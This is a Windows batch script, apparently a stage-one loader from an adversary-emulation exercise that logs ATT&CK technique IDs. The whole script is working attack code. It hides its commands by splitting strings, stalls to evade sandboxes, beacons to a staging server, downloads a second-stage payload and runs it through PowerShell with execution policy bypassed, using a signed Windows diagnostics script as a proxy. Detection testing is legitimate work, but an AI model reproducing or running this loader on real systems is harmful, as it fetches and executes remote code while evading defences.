@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\7867\654f371b
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7867-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=msedges.txt
SET dvhhyc=7867

REM Log and temp directories
SET rtfqcz=%APPDATA%\!rrocubc!
SET ypujhfw=!rtfqcz!\macula-simulations.log

REM Obfuscated variable names for components
SET bin1=Ut
SET bin2=ility
SET bin3=Fun
SET bin4=ction
SET bin5=s.p
SET bin6=s1
SET lol1=!bin1!!bin2!!bin3!!bin4!!bin5!!bin6!

SET pow1=pow
SET pow2=er
SET pow3=shel
SET pow4=l.ex
SET pow5=e
SET powcmd=!pow1!!pow2!!pow3!!pow4!!pow5!

SET net1=c:
SET net2=\wi
SET net3=ndow
SET net4=s\di
SET net5=agno
SET net6=stic
SET net7=s\sy
SET net8=stem\
SET net9=netw
SET net10=orki
SET net11=ng
SET netpath=!net1!!net2!!net3!!net4!!net5!!net6!!net7!!net8!!net9!!net10!!net11!

SET dal1=D
SET dal2=ale
SET dale=!dal1!!dal2!

REM TTP variables
SET ttp1=T
SET ttp2=121
SET ttp3=8
SET ttp4=Sign
SET ttp5=edB
SET ttp6=inar
SET ttp7=yPr
SET ttp8=oxy
SET ttp9=Exec
SET ttp10=uti
SET ttp11=on
SET ttp_id=!ttp1!!ttp2!!ttp3!
SET ttp_name=!ttp4!!ttp5!!ttp6!!ttp7!!ttp8!!ttp9!!ttp10!!ttp11!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=stage1_bat>>> "!ypujhfw!" 2>nul

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=initial_45s>>> "!ypujhfw!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_end=initial_45s>>> "!ypujhfw!" 2>nul

REM Create temp directory if it doesn't exist
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dir_check=!rtfqcz!>>> "!ypujhfw!" 2>nul
if not exist "!rtfqcz!" (
    mkdir "!rtfqcz!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: dir_created=!rtfqcz!>>> "!ypujhfw!" 2>nul
)

REM Random delay between operations
SET /A jhvbnm=%RANDOM% %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=random_!jhvbnm!s>>> "!ypujhfw!" 2>nul
timeout /t !jhvbnm! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_end=random_!jhvbnm!s>>> "!ypujhfw!" 2>nul

REM Obfuscated heartbeat check using curl
SET cur1=cu
SET cur2=rl
SET curlexe=!cur1!!cur2!
SET flg1=-k
SET flg2= -s
SET flg3= -o
SET flg4= nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=!keghkgto!>>> "!ypujhfw!" 2>nul
!curlexe! !flg1!!flg2!!flg3!!flg4! "!keghkgto!"
if !ERRORLEVEL! neq 0 (
    SET RES=0
    SET ERR=connection_refused
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_failed=!ERRORLEVEL!>>> "!ypujhfw!" 2>nul
) else (
    SET RES=1
    SET ERR=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_success>>> "!ypujhfw!" 2>nul
)

REM TTP logging for network check
(
    echo [!DATE:~0,4!-!DATE:~5,2!-!DATE:~8,2! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|IngressToolTransfer=!RES!:!ERR!
) >> "!ypujhfw!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Construct full download URL
SET prt1=/St
SET prt2=age2/
SET prt3=!xzanpex!
SET dllurl=!mdvfmsbx!!prt1!!prt2!!prt3!
SET dllpath=!rtfqcz!\!xzanpex!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_start=!dllurl!>>> "!ypujhfw!" 2>nul
!curlexe! !flg1!!flg2! -o "!dllpath!" "!dllurl!" 2>nul
if !ERRORLEVEL! neq 0 (
    SET RES2=0
    SET ERR2=download_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_failed=!ERRORLEVEL!>>> "!ypujhfw!" 2>nul
) else (
    SET RES2=1
    SET ERR2=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_complete=!dllpath!>>> "!ypujhfw!" 2>nul
)

REM TTP logging for download
(
    echo [!DATE:~0,4!-!DATE:~5,2!-!DATE:~8,2! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|IngressToolTransfer=!RES2!:!ERR2!
) >> "!ypujhfw!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul

REM Change to network diagnostics directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!netpath!>>> "!ypujhfw!" 2>nul
cd /d "!netpath!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!CD!>>> "!ypujhfw!" 2>nul

REM Build the PowerShell command through variable indirection
SET ps1=-ep
SET ps2= bypass
SET ps3= -comm
SET ps4=and "
SET ps5=set-location -path
SET ps6= c:\windows\diagnostics\system\networking;
SET ps7= import-module .\
SET ps8=; RegSnapin 
SET ps9=;[
SET ps10=Program
SET ps11=.
SET ps12=Class
SET ps13=]::
SET ps14=()
SET ps15="

SET arg1=!ps1!!ps2!!ps3!!ps4!!ps5!!ps6!!ps7!!lol1!!ps8!!txisnba!\!xzanpex!!ps9!!ps10!!ps11!!ps12!!ps13!!dale!!ps14!!ps15!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_built=!powcmd! !arg1!>>> "!ypujhfw!" 2>nul

REM Execute the .NET DLL via UtilityFunctions.ps1
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_start=!lol1!>>> "!ypujhfw!" 2>nul
!powcmd! !arg1! 2>nul
if !ERRORLEVEL! neq 0 (
    SET RES3=0
    SET ERR3=assembly_load_failed_!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_failed=!ERRORLEVEL!>>> "!ypujhfw!" 2>nul
) else (
    SET RES3=1
    SET ERR3=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_success>>> "!ypujhfw!" 2>nul
)

REM TTP logging for signed binary proxy execution
(
    echo [!DATE:~0,4!-!DATE:~5,2!-!DATE:~8,2! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!RES3!:!ERR3!
) >> "!ypujhfw!" 2>nul

timeout /t 10 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end=stage1_bat>>> "!ypujhfw!" 2>nul
ENDLOCAL